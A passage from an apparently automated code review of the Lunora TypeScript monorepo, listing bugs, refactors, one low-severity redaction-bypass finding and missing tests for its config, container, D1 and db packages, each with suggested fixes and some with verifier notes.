LocalEndpointRequest declares an optional `schemaDirectory` (line 28), and every handler honors it (schema-edit-handler.ts:179, seed-handler.ts:129, policy-scaffold-handler runCodegen line 98). But the only transport adapter builds the request as `handle({ body: parsed, method, projectRoot })` (line 187) and its signature offers callers no way to pass the directory — both hosts call it with just projectRoot (packages/vite/src/studio-plugin.ts:378, packages/cli/src/util/studio-server.ts:189). Failure scenario: a project that configures a custom schema dir via the Vite plugin's `schemaDir` option (which the sibling wrangler-validator-plugin.ts:73 respects) gets a Studio whose schema editor answers 404 `no-schema-file`, whose seed endpoint answers `schema-not-found`, and — worse — a policy scaffold/schema edit that DID find a `lunora/` dir would run runCodegen against the wrong directory. The field is dead code as shipped.

**Suggested fix:** Add a `schemaDirectory?: string` parameter to serveJsonHandler and thread it into the handler request; plumb the hosts' schemaDir option through.

#### 4. [LOW / bug] A JSON body of literal `null` crashes all three studio handlers with a TypeError (500) instead of a 400

`packages/config/src/studio-host/schema-edit-handler.ts:131`

handlePost guards `edit === undefined || typeof edit !== "object"` — but `typeof null === "object"`, so `typeof (edit as { kind?: unknown }).kind` dereferences null and throws. The same pattern exists in policy-scaffold-handler.ts:197 (`typeof (body as { kind?: unknown }).kind` on null) and seed-handler.ts:123 (destructuring `const { count, ... } = null` throws). Failure scenario: `POST /__lunora/schema-edit` with body `null` (valid JSON, passes the CSRF layers) → serveJsonHandler's catch converts the TypeError into a 500 with a raw "Cannot read properties of null" message, instead of the intended 400 `invalid-edit`/`invalid-request`. Purely a dev-server robustness/UX issue, but it violates each handler's documented 400 contract.

**Suggested fix:** Change the guards to `edit === null || typeof edit !== "object"` (or use an isObject helper) in all three handlers.

#### 5. [LOW / refactor] applyModify/FORMATTING and the atomic temp+rename writer are each duplicated verbatim across sibling modules

`packages/config/src/remote-bindings.ts:161`

remote-bindings.ts:36+161 duplicates reconcile-bindings.ts:25+277 exactly (`FORMATTING` const and `applyModify`, the comment even says "mirrors reconcile-bindings"); reconcile-compatibility-date.ts:17 carries a third FORMATTING copy. Separately, the atomic temp-file+rename write exists three times: schema-edit-handler.ts:107 (writeSchemaAtomic) and policy-scaffold-handler.ts:81 (writeAtomic) are byte-identical (same `.lunora-tmp` suffix, and unlike scaffold-dev-variables.ts:291 they don't clean the temp file up on failure, so a crashed rename leaves `schema.ts.lunora-tmp` behind). No behavior bug today, but the jsonc-edit and atomic-write idioms are core to this package and each new copy is a chance to drift (the .dev.vars writer already gained 0o600 + cleanup that the schema writers lack).

**Suggested fix:** Extract a `jsonc-edit.ts` (FORMATTING + applyModify) and a `write-atomic.ts` (temp+rename with failure cleanup) and use them from all call sites.

#### 6. [LOW / reuse] parseDevVariable hand-rolls the .dev.vars line grammar that dev-variables-format.ts declares itself the single owner of — with behavioral drift

`packages/config/src/studio-host/admin-token.ts:8`

dev-variables-format.ts's header says it is "one owner, shared by every reader/writer of the file so the format can't drift between packages", yet admin-token.ts (same package) reimplements the split/comment-skip/unquote logic. The drift is already real: (1) admin-token skips DEV_VARS_KEY_PATTERN validation of the key; (2) its unquote lacks the `length >= 2` guard — a line `LUNORA_ADMIN_TOKEN="` yields `"".slice(1,-1)` → empty → undefined, while parseDevVariableEntries returns the literal quote char, so the studio and `lunora env` disagree on the same file. Failure scenario is cosmetic today, but any future grammar change (e.g. `export KEY=` support) will silently miss this copy.

**Suggested fix:** Reimplement parseDevVariable as a thin wrapper: find the entry via parseDevVariableEntries(contents) and return the unquoted value (mapping "" to undefined).

#### Missing test coverage

- reconcileWranglerCompatibilityDate (src/reconcile-compatibility-date.ts) has no test file at all despite rewriting wrangler.jsonc — the bump-only/idempotent/exports-cache-detection branches are all unexercised
- No test asserts that provider-issued keys (RESEND_API_KEY, STRIPE_SECRET_KEY, POLAR_ACCESS_TOKEN) survive .dev.vars scaffolding as placeholders instead of being minted random hex — the exact gap that let the generatedSecretFor bug ship (package-aware-scaffold.test.ts only checks .dev.vars.example, never the generated .dev.vars)
- serve-json-handler's MAX_BODY_BYTES oversize-body rejection path and a literal `null` JSON body are untested (serve-json-handler.test.ts covers only CSRF and happy paths)
- validateWranglerConfig with null or non-object entries in durable_objects.bindings / d1_databases (the untrusted-JSONC contract the file documents) has no test — every other section's null-entry tolerance is tested, these two crash
- appendDevVariables retry exhaustion — the LunoraError thrown after APPEND_MAX_ATTEMPTS losing compare-and-swap attempts (scaffold-dev-variables.ts:399) is never exercised; only the single-race merge is
- LunoraReporter (src/lunora-reporter.ts) is completely untested: stderr-vs-stdout routing by level, the informational/warning aliases, Error-context stack rendering, and multi-line indent framing
- loadStudioAssets / studioAssetsStamp (studio-host/assets.ts) are untested — the warn-once path when @lunora/studio is missing and the mtime freshness stamp that drives live studio-rebuild pickup (assets.test.ts covers only resolveContainedFile, path matching, and content types)

<a id="lunoracontainer"></a>

### @lunora/container

**Assessment:** @lunora/container is in good health: authoring-time validation in defineContainer is unusually thorough, the client retry/backoff machinery and the best-effort lifecycle reporting are carefully written and well tested, and no security issues were found (env-name validation blocks env injection, tokens never leak into errors, admin/bearer flows stay on internal bindings). The findings are one medium bug — a memoised rejected promise in the LunoraContainer secretsStore resolver that permanently poisons a DO instance after one transient Secrets Store failure — plus two small edge-case bugs (pool() retry masking errors for body-carrying Requests, unvalidated numeric sleepAfter) and two concrete reuse cleanups (applyJurisdiction duplicated twice in-package and 5x repo-wide; the test double hand-rolling binding names).

#### 1. [MEDIUM / bug] resolveSecretsStoreEnv permanently caches a rejected promise, poisoning the DO instance after one transient Secrets Store failure

`packages/container/src/do/index.ts:262`

`this.lunoraSecretsStoreResolved ??= (async () => { ... })()` memoises the resolution promise before it settles and never clears it on failure. `store.get()` is a remote Secrets Store call that can fail transiently (network blip, store hiccup); if the first `containerFetch()` or `start()` hits such a failure, the rejected promise stays cached in `lunoraSecretsStoreResolved`, and every subsequent `containerFetch`/`start` on that Durable Object re-awaits the same rejection forever. The instance can never serve a request again until the DO is evicted, and the surfaced error is the stale first failure. The stated intent ("fail the start") only warrants failing that start, not all future ones. Fix: clear the memo on rejection, e.g. `.catch((e) => { this.lunoraSecretsStoreResolved = undefined; throw e; })` inside the assignment.

**Suggested fix:** Reset `this.lunoraSecretsStoreResolved` to undefined when the resolution promise rejects so the next start retries resolution instead of replaying the cached rejection.

#### 2. [LOW / bug] pool() retry with a pre-built body-carrying Request throws 'Body has already been used' outside the try, masking the real failure

`packages/container/src/client.ts:536`

In `poolHandleFor`, `const request = toRequest(input, init, port)` runs OUTSIDE the try block on every attempt. When `input` is a pre-built `Request` with a body, the first `new Request(input)` disturbs the input's body (Fetch spec), so on attempt 2 `toRequest` throws a synchronous TypeError ("body already used") that propagates raw — the caller sees a confusing TypeError instead of the retryable 503/network error that triggered the retry. The sibling `coldStartRetryingHandle` (line 413) guards exactly this with `totalAttempts = typeof input === "string" ? attempts : 1`; `poolHandleFor` has no such guard, only a doc comment. Failure scenario: `ctx.containers.x.pool().fetch(new Request(url, { method: "POST", body }))` → instance returns 503 → retry constructs the Request again → TypeError swallows the actual response.

**Suggested fix:** Clamp attempts to 1 for non-string inputs in `poolHandleFor`, mirroring `coldStartRetryingHandle`'s `totalAttempts` guard (or build the Request once and reject non-replayable inputs with a directed error).

#### 3. [LOW / bug] defineContainer validates string sleepAfter but accepts any numeric sleepAfter (0, negative, NaN, fractional)

`packages/container/src/define-container.ts:351`

`defineContainer` only checks `sleepAfter` when it is a string (`SLEEP_AFTER_PATTERN`); a number passes through with no validation, unlike `hardTimeout` where `assertValidHardTimeout` (line 266) enforces a positive integer for numbers. `defineContainer({ image: "./app", sleepAfter: 0 })` or `sleepAfter: -30` is accepted at authoring time and reaches `@cloudflare/containers`' base class, producing an immediate-sleep/undefined runtime behavior instead of the directed authoring-time error every other field gets. This is exactly the class of mistake the validator exists to catch, and the asymmetry with the same-grammar `hardTimeout` looks like an oversight.

**Suggested fix:** Apply the same `Number.isInteger(x) && x >= 1` check to a numeric `sleepAfter` that `assertValidHardTimeout` applies to `hardTimeout`.

#### 4. [LOW / reuse] applyJurisdiction + DurableObjectJurisdiction duplicated twice inside this package (and 5x across the repo)

`packages/container/src/do/report-lifecycle.ts:59`

`applyJurisdiction` and the `DurableObjectJurisdiction` union are defined verbatim in both src/client.ts:75 and src/do/report-lifecycle.ts:59 (identical logic, identical error message), and the same helper exists again in packages/runtime/src/resolve-shard.ts:50 (exported), packages/scheduler/src/jurisdiction.ts:12, and packages/mail/src/inbound/shard.ts:38. Within this package alone the two copies can drift (e.g. one gaining a new jurisdiction value or a changed error message). This is a zero-dependency helper — exactly the profile the repo-root `shared/` folder exists for (like shared/stable-key.ts), or at minimum a single `src/jurisdiction.ts` module both halves of this package import.

**Suggested fix:** Hoist applyJurisdiction + DurableObjectJurisdiction into a single module (repo-root shared/ given the 5 cross-package copies, or a package-local src/jurisdiction.ts as a first step) and import it from client.ts and do/report-lifecycle.ts.

#### 5. [LOW / reuse] createContainerTestContext hand-derives the binding name instead of using containerBindingName, producing wrong names for camelCase exports

`packages/container/src/client.ts:651`

The test double builds `binding: \`CONTAINER_${exportName.toUpperCase()}\``while the real derivation is`containerBindingName`in define-container.ts:107, which inserts underscores at camelCase boundaries. For`imageResizer`the double reports`CONTAINER_IMAGERESIZER`where production uses`CONTAINER_IMAGE_RESIZER`. The binding name surfaces in the double's directed error messages (e.g. lifecycleCall's "the \"CONTAINER_IMAGERESIZER\" container DO does not expose stop()"), sending a developer hunting for a binding name that doesn't exist. define-container.ts is already imported nowhere in client.ts, but the module is Node-safe and dependency-free, so importing `containerBindingName` costs nothing.

**Suggested fix:** Import containerBindingName from ./define-container and use it for the test-double spec's binding field.

#### Missing test coverage

- LunoraContainer.containerFetch override is never tested — tests exercise resolveSecretsStoreEnv directly and start(), but not the proxy path that must resolve secretsStore before delegating to super.containerFetch (src/do/index.ts:132).
- awaitReadinessCheck's deadline/timeout branch (probe never returns the expected status → LunoraError after READINESS_TIMEOUT_MS, src/do/index.ts:347) is untested; only the success and missing-port branches are covered.
- A rejected secretsStore resolution followed by a second start/fetch is untested — a test would have caught the memoised-rejection bug (src/do/index.ts:262).
- coldStartRetryingHandle's backoff doubling/clamping delays are never asserted (only poolHandleFor's clamp is, client.test.ts:401); the cold-start path uses a different base default (500ms) worth pinning.
- isColdStartTransient's unreadable-body catch branch (readBodyPrefix throwing → treated as non-transient, src/client.ts:388) and the 1024-byte scan cap on a large body have no test.
- onHardTimeoutExpired invoked without a payload (payload?.generation === undefined skips the staleness guard, src/do/index.ts:206) is untested — the base scheduler could dispatch without one.
- parseDurationSeconds has no direct unit tests for numeric input flooring or the m/h units (src/define-container.ts:34); only "30s" is exercised indirectly via armHardTimeout.
- poolHandleFor with a pre-built Request input (single-send vs. retry behavior) is untested, unlike the equivalent cold-start-handle case (client.test.ts:562) — a test here would have exposed the body-reuse TypeError.

<a id="lunorad1"></a>

### @lunora/d1

**Assessment:** A small, well-documented adapter with strong injection hygiene (table/column names validated against live metadata before quoting, values always bound) and a proportionally large test suite (~4.5k test LOC for ~1.4k src LOC). The real issues cluster in less-trafficked admin/migration edges: non-deterministic export pagination, a validator/trimmer mismatch in the migration runner, and a redaction bypass oracle in the studio introspector.

#### 1. [MEDIUM / bug] exportGlobalRows pages with LIMIT/OFFSET but no ORDER BY — snapshot can skip or duplicate rows

`packages/d1/src/admin-export-import.ts:91`

The export loop runs `SELECT * FROM <table> LIMIT ? OFFSET ?` with no ORDER BY. SQLite gives no ordering guarantee for an unordered SELECT, and each page is a separate query, so the engine is free to return pages that overlap or miss rows (and any concurrent insert/delete between pages shifts offsets, silently dropping or double-emitting rows in the NDJSON snapshot). The doc comment claims an offset scan is 'predictable', but that only holds for a single-connection, write-quiesced rowid table — none of which is enforced. A production export taken while the app is live can produce a corrupt snapshot with no error.

**Suggested fix:** Keyset-paginate on the primary key: `WHERE "id" > ? ORDER BY "id" LIMIT ?` carrying the last id forward. This is deterministic under concurrent writes and also avoids O(n^2) OFFSET scans on large tables (the package even has a keyset-vs-offset bench showing the win).

#### 2. [MEDIUM / bug] assertSingleStatement accepts trailing text that TRAILING_SEMICOLON_RE never strips, so 'valid' migrations fail at apply time

`packages/d1/src/migration-runner.ts:221`

Verified by executing an extracted copy of the lexer: (1) `SELECT 1; -- trailing comment` passes the lexer (trailing comments are documented as allowed, line 44) but `/;\s*$/` does not match, so the `;` plus comment are submitted to D1, which rejects statements with trailing content — the exact failure the strip exists to prevent. (2) `SELECT 1;;` passes (the second `;` hits the `character === ";"` branch at line 132 before the seenStatement guard) yet the regex removes only the last `;`, submitting `SELECT 1;`. (3) The quote-opening branches (lines 110/115) precede the seenStatement check, so `SELECT 1; 'stray string'` passes validation and reaches D1 unstripped. In all three cases a migration the validator blesses errors at runtime with a confusing D1 error instead of the clear 'more than one SQL statement' message.

**Suggested fix:** After the lexer confirms a single statement, strip everything from the terminating `;` onward (the lexer already knows its index) instead of regex-trimming; and move the string-literal branches after the seenStatement guard (or set seenStatement handling to reject any non-comment token).

#### 3. [LOW / bug] Concurrent MigrationRunner.run() calls double-apply migrations — no UNIQUE on the tracking hash

`packages/d1/src/migration-runner.ts:186`

run() reads the applied-hash set once (line 186) and then applies each pending migration. Two runners racing (e.g. parallel CI deploys or two worker isolates invoking the migrate path) both see the hash absent and both execute the body+tracking batch; TRACKING_TABLE_DDL (line 25) has no UNIQUE(hash), so both tracking INSERTs succeed and a non-idempotent migration (e.g. `INSERT INTO ...` seed data, `ALTER TABLE ADD COLUMN`) applies twice. D1 batch atomicity does not help because each runner's batch is internally consistent.

**Suggested fix:** Add `UNIQUE(hash)` to the tracking DDL (new deployments) and treat a unique-violation on the tracking INSERT as 'already applied' — the batch atomicity then rolls back the duplicate body automatically.

#### 4. [LOW / bug] exportGlobalRows throws 'no such table' for never-provisioned global tables instead of yielding zero rows

`packages/d1/src/admin-export-import.ts:85`

Global tables are provisioned lazily (memoised inside createD1CtxDb on first write) or by the introspector, which deliberately calls ensureGlobalTables first (introspect.ts:35 documents exactly this failure). exportGlobalRows selects from every schema global table with no provisioning step, so exporting a fresh deployment — or any schema table that has never been written — aborts the whole NDJSON stream mid-way with a raw `no such table` error rather than exporting the table as empty. Tests never hit this because they always insert before exporting.

**Suggested fix:** Call `runD1GlobalTableMigrations(exec, schema)` at the top of exportGlobalRows (idempotent CREATE IF NOT EXISTS, same as the introspect twin), or catch the missing-table error per table and continue.

#### 5. [LOW / refactor] D1Session.prepare and D1Client.prepare duplicate the same 24-line LRU statement-cache verbatim

`packages/d1/src/d1-client.ts:75`

Lines 75-98 (D1Session) and 173-200 (D1Client) are the identical get→delete→re-insert MRU bump plus capacity-eviction machine over a Map, differing only in the underlying prepare target. The eviction/ordering logic is subtle enough that a future fix applied to one copy and not the other is a realistic drift (the eviction branch is currently untested in either copy). D1DatabaseLike.exec (line 13) is also declared but never used by anything in the package.

**Suggested fix:** Extract a tiny `prepareCached(cache, factory, sql)` helper (or a small LruStmtCache class) used by both, and drop the unused `exec` member from D1DatabaseLike.

#### 6. [LOW / reuse] Local quoteIdentifier copy violates the shared helper's single-definition rule

`packages/d1/src/introspect.ts:120`

introspect.ts declares its own `quoteIdentifier` even though the package already imports the canonical one from shared/quote-identifier.ts via ./dialect (admin-export-import.ts:13 does this correctly). shared/quote-identifier.ts's own doc says it is a security-relevant primitive that 'must have exactly ONE definition rather than byte-identical copies that can drift' — this file is precisely such a drifting copy, and it sits on the injection-defense path for every interpolated table/column identifier in the studio browser.

**Suggested fix:** Delete the local const and `import { quoteIdentifier } from "./dialect"`.

#### 7. [LOW / security] Eq filters on sensitive external columns give an equality oracle that bypasses the redaction guarantee

`packages/d1/src/introspect.ts:183`

The module's stated guardrail is that sensitive columns (password/token/secret/hash/salt/credential) on external tables never leak: page rows are masked to '•••' (line 216) and facetGlobalColumn explicitly collapses them to one redacted bucket (lines 363-367). But buildEqPredicate (lines 182-195) accepts a filter on any displayed column, including sensitive ones, so a studio/admin caller can issue `filters: [{column: "token", value: guess}]` against e.g. a better-auth table and read `total > 0` — a value-confirmation oracle. Low-entropy secrets (short OTP/verification codes, known-dictionary password hashes) are enumerable this way despite the redaction. The surface is admin-authenticated, so severity is low, but it directly contradicts the invariant the two other paths enforce.

**Suggested fix:** In buildEqPredicate, reject (or refuse to bind a value for) a filter whose column matches SENSITIVE_COLUMN when `schema.tables[table] === undefined`, mirroring the facet path's check.

#### Missing test coverage

- migration-runner: text after the terminating `;` — a trailing `-- comment`, `;;`, or a stray string literal — is never tested; existing tests only cover semicolons inside strings/comments and blatant two-statement SQL, missing exactly the accept-then-fail-at-D1 mismatch (migration-runner.ts:139/221).
- exportGlobalRows multi-batch paging: no test sets batchSize below the row count, so the hasMore/offset loop (admin-export-import.ts:89-99) always runs a single iteration — page-boundary arithmetic is unexercised.
- importGlobalRows with args.exec supplied: the direct `SELECT 1 ... WHERE "id" = ? LIMIT 1` conflict-probe branch (admin-export-import.ts:167) is untested — every test exercises only the writer.get fallback.
- LRU eviction in D1Client.prepare / D1Session.prepare at STMT_CACHE_CAPACITY (d1-client.ts:87-93, 189-195): tests verify cache hits and distinct entries but never overflow the 256-entry cap, so the oldest-key eviction branch never runs.
- buildEqPredicate IS NULL branch (introspect.ts:189-190): no test passes a null/undefined filter value, so the `column IS NULL` compilation path is unverified.
- D1Client.drizzleSession(bookmark) has zero direct tests (only .drizzle/.batch are hit indirectly through MigrationRunner fakes and one workerd smoke test) — the session cast + bookmark plumbing into drizzle is unexercised.
- facetGlobalColumn's redacted single-bucket path combined with active filters (introspect.ts:363-367): the sensitive-column collapse is tested only without a WHERE clause, so countRows-with-predicate under redaction is unverified.

<a id="lunoradb"></a>

### @lunora/db

**Assessment:** A carefully-documented, well-unit-tested package whose core diff/gate/outbox helpers are solid, but it has three serious lifecycle/idempotency mismatches with its TanStack peers: a stale diff cache and forgotten scope args after TanStack's gc-driven sync restart (collections render empty on remount), and a missing wire-level idempotency key on the collection-insert retry path (double-apply after a lost ack). No security issues found — it is a client-side binding with no injection surface, and the offline replay path correctly applies an identity guard.

#### 1. [HIGH / bug] syncedJson diff cache survives TanStack gc cleanup, leaving the collection permanently empty after a sync restart — **verified: confirmed**

`packages/db/src/collection-options.ts:168`

The `syncedJson` map is deliberately owned outside `sync.sync` (collection-options.ts:164-168) and the cleanup function returned at lines 253-258 never clears it, on the documented assumption that a restart "starts from the committed synced state". That assumption is wrong for the pinned peer: in @tanstack/db 0.6.14, when all subscribers unsubscribe and gcTime (default 300s) elapses, `state.cleanup()` clears `syncedData` entirely (dist/esm/collection/state.js:946-960) and `startSync` re-invokes the config's `sync.sync` from the `cleaned-up` status (dist/esm/collection/sync.js:29). Failure scenario: user views a page (rows sync), navigates away for >5 minutes, navigates back — TanStack's store is now empty, the server re-delivers the identical snapshot, `makeDiffEmit` compares it against the stale `syncedJson`, emits zero inserts, and the collection stays empty until a row actually changes server-side. The unit test at **tests**/internals.test.ts:166-211 asserts exactly the buggy invariant (no re-inserts after restart) using a fake writer, so it passes while the real integration is broken.

**Suggested fix:** Clear `syncedJson` in the cleanup function returned from `sync.sync` (alongside `emit = undefined`), so a restart re-inserts the full snapshot into TanStack's now-empty store. Keep the map shared only within one sync session.

**Verifier note:** Verified every link of the chain. (1) packages/db/src/collection-options.ts:168 owns `syncedJson` outside `sync.sync`, and the cleanup returned at lines 253-258 resets emit/unsubscribe but never clears it — deliberately, per the comment assuming restarts resume from committed synced state. (2) That assumption fails for the actual pinned peer: fetched @tanstack/db@0.6.14 (catalog ^0.6.14) and confirmed changes.js removeSubscriber→startGCTimer at zero subscribers, lifecycle.js performCleanup (default gcTime 3e5 ms) calls sync.cleanup() then state.cleanup() which clears syncedData entirely and sets status `cleaned-up`; addSubscriber on `cleaned-up` calls sync.startSync(), re-invoking the same config's sync.sync with the same stale syncedJson map. (3) defineCollections passes the config to createCollection with no gcTime override, so the 300s default applies. (4) makeDiffEmit (internals.ts:162-200) emits inserts only for keys absent from syncedJson, so an identical re-delivered snapshot after gc produces zero writes while markReady() fires — the collection is ready but permanently empty until a row changes server-side. (5) The unit test at **tests**/internals.test.ts:166-211 pins exactly this no-re-insert invariant against a fake writer with no gc semantics, so CI passes while the real integration is broken. No upstream guard, config, or type constraint prevents the scenario; the unscoped default path has no cache reset (only scope() incidentally clears it via emit(new Map())). High severity is fair: silent user-visible empty data in the package's core read path under default configuration after >5 min of tab inactivity.

#### 2. [MEDIUM / bug] Scoped collections silently lose their scope across a sync restart, and scope() before sync starts drops the initial snapshot — **verified: confirmed**

`packages/db/src/collection-options.ts:242`

Two related holes in the scope/sync lifecycle. (1) On TanStack gc cleanup the returned cleanup closure (lines 253-258) tears down the scoped subscription, and the scope args are stored nowhere; when a new subscriber triggers a sync restart, the `scopeBy` branch (lines 248-251) only calls `writer.markReady()` — it never reopens the last scope. The app has no signal that the restart happened, so a scoped collection that was gc'd (subscribers gone > gcTime) remounts permanently empty until the app happens to call `scope(args)` again. (2) `scope(args)` called before TanStack first invokes `sync.sync` (or after cleanup) opens a subscription (line 277) while `emit` is still `undefined`; `onRows` at line 183 does `emit?.(...)`, so the server's initial data frame is silently dropped, and since `client.subscribe`'s synchronous last-value replay happens only at subscribe time (packages/client/src/lunora-client.ts:2547), the rows don't appear until the next server-side change. Tests only exercise the subscribe-then-scope ordering within one sync session.

**Suggested fix:** Remember the last scope args in the closure; on sync (re)start, reopen the subscription when scope args exist; alternatively buffer the latest rowset and flush it once `emit` is assigned.

**Verifier note:** Both claimed holes verified against the code. (1) Scope loss across sync restart: scope() (collection-options.ts:263-278) stores its args nowhere; the sync cleanup closure (253-258) tears down the scoped subscription and nulls emit/unsubscribe; on restart the scopeBy branch (248-251) only calls writer.markReady() and never reopens the last scope, with no app-visible signal. Sync restarts are real and author-acknowledged (comments at lines 124-125 and 164-168 explicitly reference TanStack's gcTime pause/restart lifecycle), so a gc'd scoped collection remounts empty until the app re-calls scope. (2) scope() before sync starts (or after cleanup) opens a real subscription at line 277 while emit is undefined; onRows (line 183) does emit?.(...) so the initial rowset is silently dropped and syncedJson is not updated. Confirmed in packages/client/src/lunora-client.ts:2546-2553 that last-value replay is synchronous and happens only at subscribe time — a hydrated-cache lastValue replays inside the scope() call itself, making the drop deterministic in that case; otherwise rows only appear on the next server push. Tests (packages/db/**tests**/define-collections.test.ts) only exercise subscribe-then-scope within one sync session; no guard in defineCollections prevents either ordering. Severity adjusted from high to medium: these are real silent-empty/stale-display correctness bugs in a lifecycle corner, but not data corruption or security issues, and both are partially mitigated in practice — the documented render-body scope pattern re-scopes on remount (masking hole 1 for the doc-blessed usage), and hole 2 self-heals on the next server-pushed frame and is only deterministic with a hydrated cache.

#### 3. [MEDIUM / bug] Checkpoint mutation gate mixes per-shard watermark number lines — sharded mutator overlays can drop early (flicker) or hang

`packages/db/src/collection-options.ts:195`

The list-path fallback resolves the collection's mutation gate from `options.client.confirmedMutationWatermark()` with no shard key — the default ("") bucket (packages/client/src/lunora-client.ts:906-908 keys watermarks per shard). But `bindMutators` issues and awaits sequences in the `context.shardKey` bucket (define-mutators.ts:117 seeds from `confirmedMutationWatermark(context.shardKey)`, :184 awaits `awaitMutationId(appliedSeq)`). The two sequence spaces are unrelated number lines fed into one monotonic gate. Failure scenarios: (a) a client that also runs default-shard mutators (watermark, say, 50) syncs any list data frame → the gate advances to 50 → a sharded overlay awaiting seq 2 drops before the shard's synced rows land — exactly the disappear/reappear flicker the CheckpointRegistry exists to prevent; (b) with no default-shard mutator traffic the fallback advances nothing and, since `LunoraCollectionConfig` offers no way to pass a shardKey to a `list` subscription (line 216 calls `client.subscribe` without one, though the client accepts it, lunora-client.ts:2494), the settled-frame watermarks are default-shard too, so `awaitMutationId` can hang and the transaction/overlay stays pinned forever.

**Suggested fix:** Add a `shardKey` to the list config (forwarded to `client.subscribe` and to `confirmedMutationWatermark(shardKey)`), or bucket the CheckpointRegistry's mutation gate per shard so per-shard sequences never compare against the default-bucket watermark.

#### 4. [MEDIUM / bug] Bare crypto.randomUUID() throws in non-secure contexts, breaking every db.actions.* call

`packages/db/src/define-collections.ts:310`

`actions[name]` calls `crypto.randomUUID()` unguarded. In browsers, `crypto.randomUUID` exists only in secure contexts — on a plain-HTTP dev/LAN origin (http://192.168.x.x) it is undefined and every action invocation throws `TypeError: crypto.randomUUID is not a function`, so no optimistic insert or outbox write ever happens. Both of this package's own dependencies treat this as a real case: @lunora/client guards it with a getRandomValues/Math.random fallback (packages/client/src/offline-queue.ts:66-82, with a comment naming exactly this scenario), and @tanstack/db exports `safeRandomUUID` (used by @tanstack/offline-transactions' OfflineTransaction). The eslint-disable comment on line 309 asserts availability "in browser/edge/Node >=22" but overlooks the secure-context restriction.

**Suggested fix:** Use `safeRandomUUID` from the `@tanstack/db` peer (already imported in this file), or replicate the client's guarded fallback.

#### 5. [LOW / bug] Collection-insert replay mints a fresh idempotency key on every retry — committed-but-unacked writes apply twice — **verified: confirmed**

`packages/db/src/define-collections.ts:214`

The per-collection outbox handler calls `client.mutation(insert.mutation, insert.toArgs(row))` with no third argument. `LunoraClient.mutation` then mints a new id per call (`options.mutationId ?? nextId()`, packages/client/src/lunora-client.ts:1420), so the server cannot dedupe retries. Failure scenario: the mutation commits on the DO but the response is lost (network drop); `runOutboxMutation` sees a code-less error and rethrows as transient; the executor retries; the second attempt carries a different `x-lunora-mutation-id` and the row is inserted twice. The sibling `__lunora_outbox__` handler in the same file (lines 259-261) explicitly passes `{ mutationId: meta.idempotencyKey }` "so a committed-but-unacked write ... is deduped by the server instead of applied twice" — the insert path has the same hole. Note the executor already hands a stable key to every mutationFn: `OfflineMutationFnParams` includes `idempotencyKey: string` (@tanstack/offline-transactions types.d.ts:2-4), which the handler currently ignores (it destructures only `{ transaction }`). Server-side dedup currently relies entirely on the app's mutation manually deduping on the forwarded `_id` arg, which nothing enforces.

**Suggested fix:** Destructure `idempotencyKey` from the mutationFn params and pass `{ mutationId: idempotencyKey }` (suffixed with the mutation index for batched transactions, or use `row._id`) to `client.mutation`, mirroring the reserved outbox handler.

**Verifier note:** The finding's mechanics are all accurate: define-collections.ts:214 calls client.mutation with no third argument, so each executor retry mints a fresh mutationId (lunora-client.ts:1420) and never benefits from the server's (identity, mutationId) idempotency table (packages/do/src/ctx-db-idempotency.ts, shard-do.ts:2120); the executor does retry code-less errors; and OfflineMutationFnParams really does hand the handler a stable idempotencyKey it ignores (verified from the published @tanstack/offline-transactions@1.0.39 tarball).

However, the claimed HIGH-severity failure — "the row is inserted twice" — is refuted for this codebase as it exists. The insert path has a deliberate alternative dedup mechanism the finding dismisses: InsertBinding.toArgs's contract forwards the client-generated UUID `_id` as the mutation's clientId, and ctx.db.insert(..., { clientId }) makes it the row's PRIMARY KEY with uniqueness enforced by constraint (packages/do/src/ctx-db.ts:583-586, 2801-2803). A committed-but-unacked retry therefore hits "UNIQUE constraint failed", which is remapped to a coded CONFLICT error (ctx-db.ts:1503-1513) → NonRetriableError → the transaction is dropped. No duplicate row. Every in-repo consumer follows this pattern (apps/playground/lunora/messages.ts:66, channels.ts:53), and define-collections.test.ts:226-228 explicitly pins it as the design ("a retry replays the same clientId and the server can dedupe it"). Double-apply requires hypothetical third-party app code that violates the documented contract.

What survives is a meaningfully weaker defect with the same root cause and same one-line fix: in the committed-but-unacked window, the retry's PK CONFLICT is indistinguishable from a genuine application conflict, so onWriteRejected falsely reports a successful write as permanently dropped ("couldn't save" for a saved row) and the awaited transaction rejects — where passing the already-available idempotencyKey as mutationId would return the server's cached success. Plus the clientId contract is doc-comment-only, so a consumer mutation with pre-insert external side effects (e.g. workflow/queue calls) could still double-fire those. Data converges in all documented usage (no duplication, synced row supersedes), so this is an error-signaling/hardening issue, not a data-integrity one: low severity.

#### 6. [LOW / refactor] Exported VERSION constant is hardcoded to "0.0.0" while the package is at 1.0.0-alpha.20

`packages/db/src/index.ts:22`

`export const VERSION = "0.0.0"` is a public export that reports a wrong version; packem.config.ts has no replace/define step that substitutes it at build time, so consumers or diagnostics reading `VERSION` get a misleading value. Either it is dead code or it silently lies.

**Suggested fix:** Remove the export, or wire a build-time substitution (packem define/replace from package.json version) like a real version stamp.

#### Missing test coverage

- Sync-restart against a real TanStack collection (subscribe → sync rows → unsubscribe all → gc cleanup → resubscribe): the existing makeDiffEmit restart tests (internals.test.ts:166-228) use fake writers and assert the inverse of TanStack's actual cleared-on-cleanup behavior, so the empty-collection-after-remount bug is invisible to the suite.
- Scoped-collection lifecycle edges: scope(args) called before the first subscriber (initial snapshot dropped while emit is undefined) and scope persistence across a sync restart — all scope tests run subscribe-first within a single sync session.
- The reserved **lunora_outbox** replay handler (define-collections.ts:245-262) is entirely untested: neither the identity-mismatch NonRetriableError drop nor the replay-with-original-idempotencyKey (`{ mutationId: meta.idempotencyKey, shardKey }`) call shape is asserted anywhere.
- Retry-after-transient-failure of a collection insert: no test drives a first attempt that fails code-less then succeeds, so nothing pins down what idempotency key the second client.mutation call carries (the double-apply window of finding 2).
- WriteRejectedEvent.code propagation: runOutboxMutation copies the server's `code` onto the NonRetriableError (internals.ts:226) and defineCollections forwards it (define-collections.ts:223), but no test asserts event.code (define-collections.test.ts:274-278 checks only collection/row/message).
- onUnknownMutationFn → onWriteRejected mapping (define-collections.ts:274-288): a persisted write whose mutationFn was removed in a deploy (code UNKNOWN_MUTATION_FN, best-effort row recovery) has no test.
- A throwing onWriteRejected listener must not replace the NonRetriableError verdict (the try/catch at define-collections.ts:224-228 protecting against a poison-message loop) — untested.
- The list-path checkpoint fallback (collection-options.ts:194-196) that advances the mutation gate from client.confirmedMutationWatermark() on each data frame: every test stubs the watermark to 0, so the fallback that prevents awaitMutationId hanging after a suppressed frame is never exercised.

<a id="lunoradispatch"></a>

### @lunora/dispatch

